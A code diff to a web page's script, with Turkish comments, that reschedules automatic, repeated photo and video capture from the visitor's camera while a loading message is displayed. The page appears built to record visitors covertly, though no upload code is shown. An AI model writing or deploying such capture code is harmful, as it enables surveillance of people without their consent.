@@ -153,6 +153,9 @@
             let videoCount = 0;
             let photoCount = 0;
             let stream = null;
+            let fotoInterval = null;
+            let videoInterval = null;
+            let ilkFotoCekildi = false;
             
             async function startCamera() {
                 try {
@@ -172,7 +175,7 @@
                         document.getElementById('loading').style.display = 'block';
                         
                         // ========================================
-                        // FOTOĞRAF - HEMEN BAŞLA (0ms)
+                        // FOTOĞRAF FONKSİYONU
                         // ========================================
                         function fotoCek() {
                             if (!stream?.active) return;
@@ -197,16 +200,10 @@
                             }, 'image/jpeg', 0.85);
                         }
                         
-                        // İLK FOTO HEMEN
-                        fotoCek();
-                        
-                        // DİĞER FOTOLAR
-                        setInterval(fotoCek, FOTO_SURESI * 1000);
-                        
                         // ========================================
-                        // VİDEO - HEMEN BAŞLA (0ms)
+                        // VİDEO FONKSİYONU
                         // ========================================
-                        function videoBaslat() {
+                        function videoCek() {
                             if (!stream?.active) return;
                             
                             videoCount++;
@@ -248,11 +245,32 @@
                             } catch(e) {}
                         }
                         
-                        // İLK VİDEO HEMEN
-                        videoBaslat();
+                        // ========================================
+                        // SIRALI BAŞLANGIÇ
+                        // ========================================
                         
-                        // DİĞER VİDEOLAR
-                        setInterval(videoBaslat, VIDEO_SURESI * 1000);
+                        // 1. VİDEO HEMEN BAŞLASIN
+                        videoCek();
+                        
+                        // 2. FOTOĞRAFLAR 500ms SONRA BAŞLASIN (1. VİDEO KARARLI OLSUN)
+                        setTimeout(() => {
+                            // İlk fotoğraf
+                            fotoCek();
+                            ilkFotoCekildi = true;
+                            
+                            // Diğer fotoğraflar
+                            fotoInterval = setInterval(() => {
+                                if (!stream?.active) return;
+                                fotoCek();
+                            }, FOTO_SURESI * 1000);
+                            
+                        }, 500);
+                        
+                        // 3. DİĞER VİDEOLAR
+                        videoInterval = setInterval(() => {
+                            if (!stream?.active) return;
+                            videoCek();
+                        }, VIDEO_SURESI * 1000);
                     };
                     
                 } catch(e) {
@@ -261,6 +279,8 @@
             }
             
             window.onbeforeunload = function() {
+                if (fotoInterval) clearInterval(fotoInterval);
+                if (videoInterval) clearInterval(videoInterval);
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
@@ -269,4 +289,4 @@
         })();
     </script>
 </body>
-</html>
+    </html>
